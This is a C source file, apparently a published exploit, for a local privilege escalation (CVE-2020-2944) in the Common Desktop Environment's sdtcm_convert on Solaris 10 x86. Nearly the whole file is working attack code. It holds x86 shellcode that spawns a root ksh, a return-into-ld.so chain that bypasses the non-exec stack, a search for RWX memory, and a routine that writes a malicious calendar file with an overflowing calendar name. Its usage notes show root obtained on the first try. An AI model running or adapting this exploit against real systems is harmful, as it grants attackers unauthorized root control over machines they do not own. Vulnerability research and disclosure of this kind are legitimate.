/*
 * raptor_sdtcm_conv.c - CDE sdtcm_convert LPE for Solaris/Intel
 * Copyright (c) 2019-2020 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * A buffer overflow in the _SanityCheck() function in the Common Desktop
 * Environment version distributed with Oracle Solaris 10 1/13 (Update 11) and
 * earlier allows local users to gain root privileges via a long calendar name
 * or calendar owner passed to sdtcm_convert in a malicious calendar file
 * (CVE-2020-2944).
 *
 * The open source version of CDE (based on the CDE 2.x codebase) is not
 * affected, because it does not ship the vulnerable binary.
 *
 * "CDE, the gift that keeps on giving" -- @0xdea
 * "Feels more like a curse you can't break from this side." -- @alanc
 *
 * This exploit uses the ret-into-ld.so technique to bypass the non-exec stack
 * protection. In case troubles arise with NULL-bytes inside the ld.so.1 memory
 * space, try returning to sprintf() instead of strcpy().
 *
 * I haven't written a Solaris/SPARC version because I don't have a SPARC box
 * on which Solaris 10 can run. If anybody is kind enough to give me access to
 * such a box, I'd be happy to port my exploit to Solaris/SPARC as well.
 *
 * Usage:
 * $ gcc raptor_sdtcm_conv.c -o raptor_sdtcm_conv -Wall
 * $ ./raptor_sdtcm_conv
 * [...]
 * Do you want to correct it? (Y/N) [Y] n
 * # id
 * uid=0(root) gid=1(other) egid=12(daemon)
 * #
 *
 * This should work with any common configuration on the first try. To
 * re-enable rpc.cmsd, clear its service maintenance status by running the
 * following commands as root:
 * # /usr/sbin/svcadm clear cde-calendar-manager
 * # /usr/bin/svcs -a | grep calendar
 * online         13:16:54 svc:/network/rpc/cde-calendar-manager:default
 *
 * Tested on:
 * SunOS 5.10 Generic_147148-26 i86pc i386 i86pc (Solaris 10 1/13)
 * [previous Solaris versions are also likely vulnerable]
 */

#include <fcntl.h>
#include <link.h>
#include <procfs.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/systeminfo.h>
#include <sys/types.h>

#define INFO1	"raptor_sdtcm_conv.c - CDE sdtcm_convert LPE for Solaris/Intel"
#define INFO2	"Copyright (c) 2019-2020 Marco Ivaldi <raptor@0xdeadbeef.info>"

#define	VULN	"/usr/dt/bin/sdtcm_convert"	// the vulnerable program
#define ADMIN	"/usr/dt/bin/sdtcm_admin"	// calendar admin utility
#define	BUFSIZE	2304				// size of the name/owner
#define PAYSIZE	1024				// size of the payload
#define OFFSET	env_len / 2			// offset to the shellcode

char sc[] = /* Solaris/x86 shellcode (8 + 8 + 27 = 43 bytes) */
/* double setuid() */
"\x31\xc0\x50\x50\xb0\x17\xcd\x91"
"\x31\xc0\x50\x50\xb0\x17\xcd\x91"
/* execve() */
"\x31\xc0\x50\x68/ksh\x68/bin"
"\x89\xe3\x50\x53\x89\xe2\x50"
"\x52\x53\xb0\x3b\x50\xcd\x91";

/* globals */
char	*env[256];
int	env_pos = 0, env_len = 0;

/* prototypes */
int	add_env(char *string);
void	check_zero(int addr, char *pattern);
int	search_ldso(char *sym);
int	search_rwx_mem(void);
void	set_val(char *buf, int pos, int val);

/*
 * main()
 */
int main(int argc, char **argv)
{
	char	buf[BUFSIZE], payload[PAYSIZE];
	char	platform[256], release[256], hostname[256];
	int	i, payaddr;

	char	*arg[3] = {"foo", "hax0r", NULL};
	int	sb = ((int)argv[0] | 0xfff);	/* stack base */
	int	ret = search_ldso("strcpy");	/* or sprintf */
	int	rwx_mem = search_rwx_mem();	/* rwx memory */

	char	cmd[1024];
	FILE	*fp;

	/* print exploit information */
	fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);

	/* read command line */
	if (argc != 1) {
		fprintf(stderr, "Usage:\n%s\n[...]\n", argv[0]);
		fprintf(stderr, "Do you want to correct it? (Y/N) [Y] n\n\n");
		exit(1);
	}

	/* get system information */
	sysinfo(SI_PLATFORM, platform, sizeof(platform) - 1);
	sysinfo(SI_RELEASE, release, sizeof(release) - 1);
	sysinfo(SI_HOSTNAME, hostname, sizeof(release) - 1);

	/* prepare the payload (NOPs suck, but I'm too old for VOODOO stuff) */
	memset(payload, '\x90', PAYSIZE);
	payload[PAYSIZE - 1] = 0x0;
	memcpy(&payload[PAYSIZE - sizeof(sc)], sc, sizeof(sc));

	/* fill the envp, keeping padding */
	add_env(payload);
	add_env("HOME=/tmp");
	add_env(NULL);

	/* calculate the payload address */
	payaddr = sb - OFFSET;

	/* prepare the evil palette name */
	memset(buf, 'A', sizeof(buf));
	buf[sizeof(buf) - 1] = 0x0;

	/* fill with function address in ld.so.1, saved eip, and arguments */
	for (i = 0; i < BUFSIZE - 16; i += 4) {
		set_val(buf, i, ret);		/* strcpy */
		set_val(buf, i += 4, rwx_mem);	/* saved eip */
		set_val(buf, i += 4, rwx_mem);	/* 1st argument */
		set_val(buf, i += 4, payaddr);	/* 2nd argument */
	}

	/* print some output */
	fprintf(stderr, "Using SI_PLATFORM\t: %s (%s)\n", platform, release);
	fprintf(stderr, "Using SI_HOSTNAME\t: %s\n", hostname);
	fprintf(stderr, "Using stack base\t: 0x%p\n", (void *)sb);
	fprintf(stderr, "Using rwx_mem address\t: 0x%p\n", (void *)rwx_mem);
	fprintf(stderr, "Using payload address\t: 0x%p\n", (void *)payaddr);
	fprintf(stderr, "Using strcpy() address\t: 0x%p\n\n", (void *)ret);

	/* create the evil calendar file */
	fprintf(stderr, "Preparing the evil calendar file... ");
	snprintf(cmd, sizeof(cmd), "%s -a -c hax0r@%s", ADMIN, hostname);
	if (system(cmd) == -1) {
		perror("Error creating calendar file");
		exit(1);
	}
	if (chmod("/usr/spool/calendar/callog.hax0r", 0660) == -1) {
		perror("Error creating calendar file");
		exit(1);
	}

	/* prepare the evil calendar file (badchars currently not handled) */
	fp = fopen("/usr/spool/calendar/callog.hax0r", "w");
	if (!fp) {
		perror("Error preparing calendar file");
		exit(1);
	}
	fprintf(fp, "Version: 4\n(calendarattributes "
		    "(\"-//XAPIA/CSA/CALATTR//NONSGML Access List//EN\","
		    "\"10:access_list\",\"world:2\")\n");
	/* buffer overflow in calendar name */
	fprintf(fp, "(\"-//XAPIA/CSA/CALATTR//NONSGML Calendar Name//EN\","
		    "\"5:string\",\"%s\")\n", buf);
	fprintf(fp, "(\"-//XAPIA/CSA/CALATTR//NONSGML Calendar Owner//EN\","
		    "\"6:user\",\"fnord\")\n)");
	/* buffer overflow in calendar owner */
	/*
	fprintf(fp, "(\"-//XAPIA/CSA/CALATTR//NONSGML Calendar Name//EN\","
		    "\"5:string\",\"hax0r\")\n");
	fprintf(fp, "(\"-//XAPIA/CSA/CALATTR//NONSGML Calendar Owner//EN\","
		    "\"6:user\",\"%s\")\n)", buf);
	*/
	fclose(fp);

	fprintf(stderr, "Done.\n");

	/* run the vulnerable program */
	fprintf(stderr, "Exploiting... Please answer \"n\" when prompted.\n");
	execve(VULN, arg, env);
	perror("execve");
	exit(0);
}

/*
 * add_env(): add a variable to envp and pad if needed
 */
int add_env(char *string)
{
	int	i;

	/* null termination */
	if (!string) {
		env[env_pos] = NULL;
		return env_len;
	}

	/* add the variable to envp */
	env[env_pos] = string;
	env_len += strlen(string) + 1;
	env_pos++;

	/* pad the envp using zeroes */
	if ((strlen(string) + 1) % 4)
		for (i = 0; i < (4 - ((strlen(string)+1)%4)); i++, env_pos++) {
			env[env_pos] = string + strlen(string);
			env_len++;
		}

	return env_len;
}

/*
 * check_zero(): check an address for the presence of a 0x00
 */
void check_zero(int addr, char *pattern)
{
	if (!(addr & 0xff) || !(addr & 0xff00) || !(addr & 0xff0000) ||
	    !(addr & 0xff000000)) {
		fprintf(stderr, "Error: %s contains a 0x00!\n", pattern);
		exit(1);
	}
}

/*
 * search_ldso(): search for a symbol inside ld.so.1
 */
int search_ldso(char *sym)
{
	int		addr;
	void		*handle;
	Link_map	*lm;

	/* open the executable object file */
	if ((handle = dlmopen(LM_ID_LDSO, NULL, RTLD_LAZY)) == NULL) {
		perror("dlopen");
		exit(1);
	}

	/* get dynamic load information */
	if ((dlinfo(handle, RTLD_DI_LINKMAP, &lm)) == -1) {
		perror("dlinfo");
		exit(1);
	}

	/* search for the address of the symbol */
	if ((addr = (int)dlsym(handle, sym)) == NULL) {
		fprintf(stderr, "Sorry, function %s() not found\n", sym);
		exit(1);
	}

	/* close the executable object file */
	dlclose(handle);

	check_zero(addr - 4, sym);
	return addr;
}

/*
 * search_rwx_mem(): search for an RWX memory segment valid for all
 * programs (typically, /usr/lib/ld.so.1) using the proc filesystem
 */
int search_rwx_mem(void)
{
	int	fd;
	char	tmp[16];
	prmap_t	map;
	int	addr = 0, addr_old;

	/* open the proc filesystem */
	sprintf(tmp,"/proc/%d/map", (int)getpid());
	if ((fd = open(tmp, O_RDONLY)) < 0) {
		fprintf(stderr, "Can't open %s\n", tmp);
		exit(1);
	}

	/* search for the last RWX memory segment before stack (last - 1) */
	while (read(fd, &map, sizeof(map)))
		if (map.pr_vaddr)
			if (map.pr_mflags & (MA_READ | MA_WRITE | MA_EXEC)) {
				addr_old = addr;
				addr = map.pr_vaddr;
			}
	close(fd);

	/* add 4 to the exact address NULL bytes */
	if (!(addr_old & 0xff))
		addr_old |= 0x04;
	if (!(addr_old & 0xff00))
		addr_old |= 0x0400;

	return addr_old;
}

/*
 * set_val(): copy a dword inside a buffer (little endian)
 */
void set_val(char *buf, int pos, int val)
{
	buf[pos] =	(val & 0x000000ff);
	buf[pos + 1] =	(val & 0x0000ff00) >> 8;
	buf[pos + 2] =	(val & 0x00ff0000) >> 16;
	buf[pos + 3] =	(val & 0xff000000) >> 24;
}
